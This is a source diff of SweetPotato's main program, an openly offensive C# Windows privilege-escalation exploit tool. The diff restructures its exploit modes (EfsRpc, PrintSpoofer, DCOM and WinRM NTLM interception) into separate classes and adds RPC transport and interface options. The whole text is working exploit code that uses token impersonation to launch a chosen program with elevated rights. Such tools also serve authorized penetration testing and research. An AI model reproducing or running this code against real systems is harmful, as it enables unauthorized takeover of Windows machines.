@@ -1,8 +1,6 @@
-﻿using Microsoft.Win32;
-using Mono.Options;
+﻿using Mono.Options;
 using System;
 using System.Runtime.InteropServices;
-using System.Security.Principal;
 using System.Threading;
 using static SweetPotato.ImpersonationToken;
 
@@ -22,7 +20,8 @@ namespace SweetPotato {
             ExecutionMethod executionMethod = ExecutionMethod.Auto;
             PotatoAPI.Mode mode = PotatoAPI.Mode.PrintSpoofer;
             bool showHelp = false;
-            bool isBITSRequired = false;
+            RpcTransport rpcTransport = RpcTransport.ncalrpc;
+            RpcInterface rpcInterface = RpcInterface.efsrpc; // EfsRpc only
 
             Console.WriteLine(
                 "SweetPotato by @_EthicalChaos_\n" +
@@ -39,6 +38,8 @@ namespace SweetPotato {
                 .Add("a=|args=", "Arguments for program (default null)", v => programArgs = v)
                 .Add<PotatoAPI.Mode>("e=|exploit=", "Exploit mode [DCOM|WinRM|EfsRpc|PrintSpoofer(default)] ", v => mode = v)
                 .Add<ushort>("l=|listenPort=", "COM server listen port (default 6666)", v => port = v)
+                .Add<RpcTransport>("t=|rpcTransport=", "RPC transport [ncalrpc|ncacn_np] (default: ncalrpc)", v => rpcTransport = v)
+                .Add<RpcInterface>("i=|rpcInterface=", "EfsRpc interface [efsrpc|lsarpc] (default: efsrpc)", v => rpcInterface = v)
                 .Add("h|help", "Display this help", v => showHelp = v != null);
 
             try {
@@ -75,16 +76,29 @@ namespace SweetPotato {
                     }
                 }
 
-                if (mode == PotatoAPI.Mode.PrintSpoofer) {
-                    Console.WriteLine($"[+] Attempting NP impersonation using method PrintSpoofer to launch {program}");
-                } else if (mode == PotatoAPI.Mode.EfsRpc) {
-                    Console.WriteLine($"[+] Attempting NP impersonation using method EfsRpc to launch {program}");
-                } else {
-                    Console.WriteLine("[+] Attempting {0} with CLID {1} on port {2} using method {3} to launch {4}",
-                    isBITSRequired ? "NTLM Auth" : "DCOM NTLM interception", clsId, isBITSRequired ? 5985 : port, executionMethod, program);
-                }
+                PotatoAPI potatoAPI = null;
 
-                PotatoAPI potatoAPI = new PotatoAPI(new Guid(clsId), port, mode);
+                switch (mode) {
+                    case PotatoAPI.Mode.EfsRpc:
+                        Console.WriteLine($"[+] Attempting NP impersonation using method EfsRpc using method {executionMethod} to launch {program}");
+                        potatoAPI = new EfsRpcAPI(rpcTransport, rpcInterface);
+                        break;
+                    case PotatoAPI.Mode.PrintSpoofer:
+                        Console.WriteLine($"[+] Attempting NP impersonation using method PrintSpoofer using method {executionMethod} to launch {program}");
+                        potatoAPI = new PrintSpooferAPI(rpcTransport);
+                        break;
+                    case PotatoAPI.Mode.DCOM:
+                        Console.WriteLine($"[+] Attempting DCOM NTLM interception with CLID {clsId} on port {port} using method {executionMethod} to launch {program}");
+                        potatoAPI = new COMAPI(clsId, port);
+                        break;
+                    case PotatoAPI.Mode.WinRM:
+                        Console.WriteLine($"[+] Attempting WinRM NTLM interception with CLID {clsId} on port {port} using method {executionMethod} to launch {program}");
+                        potatoAPI = new WinRMAPI(clsId, port);
+                        break;
+
+                    default:
+                        return;
+                }
 
                 if (!potatoAPI.Trigger()) {
                     Console.WriteLine("[!] No authenticated interception took place, exploit failed");
@@ -134,7 +148,7 @@ namespace SweetPotato {
                 systemThread.Join();
 
             } catch (Exception e) {
-                Console.WriteLine("[!] Failed to exploit COM: {0} ", e.Message);
+                Console.WriteLine("[!] Failed to exploit: {0} ", e.Message);
                 Console.WriteLine(e.StackTrace.ToString());
             }
         }
